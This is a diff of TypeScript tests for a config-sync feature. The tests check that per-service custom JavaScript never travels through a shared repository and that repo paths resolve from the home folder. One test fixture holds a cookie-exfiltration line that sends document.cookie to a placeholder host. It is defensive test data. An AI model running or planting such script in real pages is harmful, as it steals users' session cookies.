@@ -15,6 +15,7 @@ import {
   serialise,
   validateIncoming,
   decideSync,
+  resolveRepoPath,
   restoreLocalPreferences,
   parseRemote,
   probeUrlFor,
@@ -60,6 +61,27 @@ describe('what travels', () => {
     // An FCM registration is bound to a single receiver. Two machines holding the same endpoint
     // means both are wrong and neither gets the notification.
     expect(portable(config())).not.toHaveProperty('pushRegistrations');
+  });
+
+  it('NEVER CARRIES A SERVICE\'S CUSTOM JAVASCRIPT — anyone who can push would run script in your Gmail', () => {
+    const withJs = config({ services: [{ ...svc('one'), customJs: 'fetch("https://x.test/?c="+document.cookie)' }, svc('two')] });
+    const out = serialise(withJs);
+    expect(out).not.toContain('customJs');
+    expect(out).not.toContain('document.cookie');
+    // The rest of the service still travels.
+    expect((portable(withJs).services ?? []).map((s) => s.id)).toEqual(['one', 'two']);
+  });
+
+  it('an incoming config keeps THIS machine\'s custom JavaScript, and never adopts a repo\'s', () => {
+    const local = config({ services: [{ ...svc('one'), customJs: 'mine()' }, svc('two')] });
+    const incoming = portable(config()) as ReturnType<typeof portable>;
+    // As if the repo had been edited to carry script for both services.
+    for (const s of incoming.services) (s as { customJs?: string }).customJs = 'theirs()';
+
+    const restored = restoreLocalPreferences(incoming, local);
+    const byId = Object.fromEntries(restored.services.map((s) => [s.id, s.customJs]));
+    expect(byId['one']).toBe('mine()');
+    expect(byId['two']).toBeUndefined();
   });
 
   it('never carries window bounds or layouts — both are display-shaped', () => {
@@ -437,5 +459,25 @@ describe('the override does not travel', () => {
     // Writing "yes, I know this is public" into the public repo would be its own small absurdity,
     // and on the second machine it would pre-authorise a repo that machine never looked at.
     expect(serialise(withOverride)).not.toContain('allowPublicRepo');
+  });
+});
+
+describe('the repo path as typed', () => {
+  const home = '/Users/alice';
+
+  it("THE PLACEHOLDER'S OWN FORM WORKS — ~/code/dotfiles was used verbatim and was not a repository", () => {
+    expect(resolveRepoPath('~/code/dotfiles', home)).toBe('/Users/alice/code/dotfiles');
+    expect(resolveRepoPath('~', home)).toBe('/Users/alice');
+  });
+
+  it('a relative path is from the home folder, not from / — which is where a Finder launch runs', () => {
+    expect(resolveRepoPath('code/dotfiles', home)).toBe('/Users/alice/code/dotfiles');
+  });
+
+  it('absolute paths pass through; blank means sync is off', () => {
+    expect(resolveRepoPath('/srv/config', home)).toBe('/srv/config');
+    expect(resolveRepoPath('   ', home)).toBeNull();
+    expect(resolveRepoPath(undefined, home)).toBeNull();
+    expect(resolveRepoPath('  ~/x  ', `${home}/`)).toBe('/Users/alice/x');
   });
 });
